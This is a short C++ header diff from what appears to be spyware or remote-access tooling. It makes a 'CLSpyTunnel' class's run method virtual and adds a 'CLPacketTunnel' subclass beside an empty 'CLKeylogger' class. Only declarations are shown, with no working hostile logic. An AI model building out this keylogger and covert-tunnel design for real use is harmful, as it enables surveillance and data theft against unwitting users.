@@ -7,7 +7,7 @@ class CLSpyTunnel {
 public:
     CLSpyTunnel() = default;
     int init(const char* __ip, const int __port, const int __connection_type);
-    void run();
+    virtual void run();
     std::atomic<bool> tunnel_shutdown_flag_ = false;
 protected:
     int tunnel_socket_;
@@ -15,6 +15,11 @@ protected:
 
 class CLKeylogger : public CLSpyTunnel {
 
+};
+
+class CLPacketTunnel : public CLSpyTunnel {
+public:
+    void run() override;
 };
 
 struct CLTunnel {
